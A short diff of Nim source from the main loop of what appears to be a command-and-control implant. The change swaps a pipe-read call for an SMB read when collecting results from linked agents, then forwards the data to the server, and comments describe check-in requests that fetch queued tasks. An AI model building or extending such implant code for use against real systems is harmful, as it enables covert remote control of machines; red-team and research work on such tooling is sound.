@@ -53,9 +53,9 @@ proc main() =
 
             # Check if there are results of linked agents that need to be returned
             for agentId, hPipe in ctx.links: 
-                let resultBytes = pipeRead(cast[HANDLE](hPipe))
+                let resultBytes = ctx.smbRead(cast[HANDLE](hPipe))
                 if resultBytes.len() > 0:
-                    ctx.sendData(resultBytes)
+                    ctx.sendData(string.toBytes(resultBytes))
 
             # Retrieve task queue for the current agent by sending a check-in/heartbeat request
             # The check-in request contains the agentId and listenerId, so the server knows which tasks to return
